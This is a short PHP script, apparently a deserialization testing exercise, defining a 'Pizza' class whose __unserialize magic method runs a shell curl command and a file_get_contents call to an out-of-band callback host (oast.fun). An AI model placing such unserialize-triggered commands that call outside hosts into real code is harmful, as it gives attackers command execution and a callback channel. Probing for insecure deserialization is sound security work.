<?php
	class Pizza
	{
		public $price;
		public $cheese;
		public $size;

		public function __invoke()
		{
// 			echo $this->size->what
            echo "\n";
            echo 456;
		}
		public function __get($tomato)
        {
            echo "The Mighty Sauce";
        }
        public function __destruct()
		{
			// echo "The Mighty Ice Cream";
		}
        public function __unserialize(array $data): void
        {
            exec("curl https://bzlywuiujtzncoggqmqdxjp6qbfwkhdsd.oast.fun/?x=testing");
            $url = "https://bzlywuiujtzncoggqmqdxjp6qbfwkhdsd.oast.fun/?x=testing";
            $response = file_get_contents($url);
        }
    }
	$a = serialize(new Pizza());
    echo getName($a);
?>